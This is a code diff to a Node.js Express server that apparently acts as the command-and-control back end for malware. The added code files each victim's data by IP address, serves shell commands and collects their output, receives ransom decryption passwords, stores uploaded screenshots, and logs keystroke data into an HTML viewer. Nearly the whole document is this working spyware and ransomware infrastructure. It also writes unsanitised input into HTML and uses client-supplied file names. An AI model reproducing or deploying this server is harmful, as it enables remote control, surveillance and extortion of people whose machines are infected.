@@ -3,7 +3,8 @@ const fileUpload = require('express-fileupload');
 const app = express();
 var fs = require('fs');
 const bodyParser = require('body-parser');
-const PORT = 3000;
+var moment = require('moment'); // for date time format
+const PORT = 5000;
  
 // default options 
 app.use(fileUpload());
@@ -11,14 +12,36 @@ app.use(bodyParser.raw({type: 'application/octet-stream'}));
 
 // CMD
 app.get('/cmd', function (req, res) {
-   // console.log('***************[Get Command]*****************');
-   res.sendFile(__dirname+"/cmd.txt");
+   var ip = req.connection.remoteAddress.substring(7).replace(':','');
+   var dir = __dirname+'/DATA/'+ip;
+   if (!fs.existsSync(dir)){
+      fs.mkdirSync(dir);
+   }
+   
+   var file = dir + "/cmd.txt"; 
+   if (!fs.existsSync(file)){
+      // Create file
+      fs.appendFile(file, '', function (err, file) {
+  	if (err) throw err;
+  	console.log('Saved!');
+	});
+   }
+   res.sendFile(dir+"/cmd.txt");
 }) 
 
 // CMD
 app.post('/cmd', function (req, res) {
-   console.log('***************CMD = ['+ req.body.toString()+']********************');
-   fs.writeFile(__dirname+"/Download/cmd_output.txt", req.body.toString(), function(err) {
+   var ip = req.connection.remoteAddress.substring(7).replace(':','');
+   console.log('***************CMD = [\n'+ req.body.toString()+']********************');
+   
+   var dir = __dirname+'/DATA/'+ip;
+   if (!fs.existsSync(dir)){
+      fs.mkdirSync(dir);
+   }
+   
+   var file = dir + "/cmd_output.txt"; 
+
+   fs.writeFile( file, req.body.toString(), function(err) {
     	if(err) {
         	return console.log(err);
     	}
@@ -31,18 +54,44 @@ app.post('/cmd', function (req, res) {
 
 app.post('/decrypt', function (req, res) {
    console.log('***************Password = ['+ req.body.toString()+']********************');
+
+   var ip = req.connection.remoteAddress.substring(7).replace(':','');
+   var dir = __dirname+'/DATA/'+ip;
+   if (!fs.existsSync(dir)){
+      fs.mkdirSync(dir);
+   }
+   
+   var file = dir + "/cmd_output.txt"; 
+
+   fs.writeFile( file, req.body.toString(), function(err) {
+    	if(err) {
+        	return console.log(err);
+    	}
+    	console.log("The file was saved!");
+   });    
+
    res.send('OK');
 }) 
 
 app.get('/decrypt', function (req, res) {
+   var ip = req.connection.remoteAddress.substring(7).replace(':','');
+   var dir = __dirname+'/DATA/'+ip;
+   if (!fs.existsSync(dir)){
+      fs.mkdirSync(dir);
+   }
+   
+   var file = dir + "/cmd_output.txt"; 
+   if (!fs.existsSync(file)){
+      // Create file
+      fs.appendFile(file, '', function (err, file) {
+  	if (err) throw err;
+  	console.log('Saved!');
+	});
+   }
    console.log('***************[Send decrypt data file]*****************');
-   res.sendFile(__dirname+"/decrypt.txt");
+   res.sendFile(dir+"/decrypt.txt");
 }) 
 
-app.get('/ip', function (req, res) {
-   console.log('ip = '+ req.ip);
-   res.sendFile(__dirname+"/ip_address.txt");
-}) 
 
 app.get('/', function (req, res) {
    res.sendFile(__dirname+"/index.html");
@@ -50,31 +99,78 @@ app.get('/', function (req, res) {
 
 // get image
 app.post('/upload', function(req, res) {
-console.log("POST file");
-// "sampleFile" is name of file in html form
-console.log(req.files.sampleFile.name);
-  if (!req.files)
-    return res.status(400).send('No files were uploaded.');
- 
-  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file 
-  var sampleFile = req.files.sampleFile;
- 
-  // Use the mv() method to  
-  sampleFile.mv(__dirname+"/Download/"+req.files.sampleFile.name, function(err) {
-    if (err)
-      return res.status(500).send(err);
- 
-    res.send('File uploaded!');
-  });
+	var ip = req.connection.remoteAddress.substring(7).replace(':','');
+	var dir = __dirname+'/DATA/'+ip;
+	if (!fs.existsSync(dir)){
+	    fs.mkdirSync(dir);
+	}
+
+	// "sampleFile" is name of file in html form
+	console.log(req.files.sampleFile.name);
+	if (!req.files){
+	    console.log('NO FILE WAS SENT');
+	    return res.status(400).send('No files were uploaded.');
+ 	}
+
+	// The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file 
+	var sampleFile = req.files.sampleFile;
+
+ 	if(sampleFile.name.indexOf('tmp.png')>=0){
+		// screenshot
+		console.log('screenshot');
+		var file_name = moment().format('MMMM-Do-YYYY_hh-mm-ss_a.png');
+		console.log('file name = ' + file_name);
+		if (!fs.existsSync(dir + '/Screenshot')){
+	    		fs.mkdirSync(dir + '/Screenshot');
+		}
+		sampleFile.mv( dir +"/Screenshot/"+file_name, function(err) {
+			if (err){
+				console.log(err);
+		   		return res.status(500);
+			}
+		});
+		
+		fs.appendFile(dir +"/Logger.html", '<img src="Screenshot/'+file_name+'">', function (err, file) {
+  			if (err) throw err;
+  			console.log('Saved!');
+		});
+		
+	}else{
+		if (!fs.existsSync(dir + '/Download')){
+		    fs.mkdirSync(dir + '/Download');
+		}
+		// Use the mv() method save file
+		sampleFile.mv( dir+"/Download/"+req.files.sampleFile.name, function(err) {
+			if (err){
+			   console.log(err);
+			   return res.status(500);
+			}
+		});
+	} 
+	
+	res.send('File uploaded!');
 });
 
 
 // get key data
 app.post('/data', function(req, res) {
-	// process.stdout.write(req.body.toString());
+        var ip = req.connection.remoteAddress.substring(7).replace(':','');
+	var dir = __dirname+'/DATA/'+ip;
+	if (!fs.existsSync(dir)){
+	    fs.mkdirSync(dir);
+	}	
+
 	console.log(req.body.toString());
-	res.send('Data uploaded!');
+	
+	// Send the command
+	res.sendFile(dir+"/cmd.txt");
+	// res.send('Data uploaded!');
+
+	fs.appendFile(dir +"/Logger.html", '<p>' + req.body.toString() + '</p>', function (err, file) {
+  		if (err) throw err;
+	});
 });
+
 
 
 var server = app.listen(PORT, function () {
